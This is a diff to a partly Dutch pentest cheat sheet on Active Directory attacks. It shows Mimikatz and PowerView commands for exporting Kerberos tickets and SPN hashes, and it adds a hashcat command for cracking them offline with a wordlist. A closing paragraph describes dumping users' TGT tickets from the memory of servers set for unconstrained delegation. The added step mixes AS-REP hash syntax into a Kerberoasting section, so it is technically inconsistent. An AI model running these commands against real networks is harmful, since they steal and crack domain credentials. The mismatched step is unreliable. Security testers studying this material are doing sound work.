@@ -894,6 +894,12 @@ Invoke-Mimikatz -Command '"Kerberos::list /export"'
 Get-DomainUser -Identity <username> | Get-DomainSPNTicket | select -ExpandProperty Hash
 ```
 
+#### Crack the hash with hashcat
+Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
+```
+Hashcat -a 0 -m 18200 hash.txt rockyou.txt
+```
+
 ## Unconstrained Delegation
 Unconstrained delegation is een privilege welke kan worden toegekent aan gebruikers of computers, dit gebeurt bijna altijd bij computers met services zoals ISS en MSSQL. Deze services hebben meestal toegang nodig tot een backend database namens de geverifieerde gebruiker. Wanneer een gebruiker zich verifieert op een computer waarop onbeperkt Kerberos-delegatierecht is ingeschakeld, wordt het geverifieerde TGT-ticket van de gebruiker opgeslagen in het geheugen van die computer. Als je administrator toegang hebt tot deze server, is het mogelijk om alle TGT tickets uit het geheugen te dumpen.
 
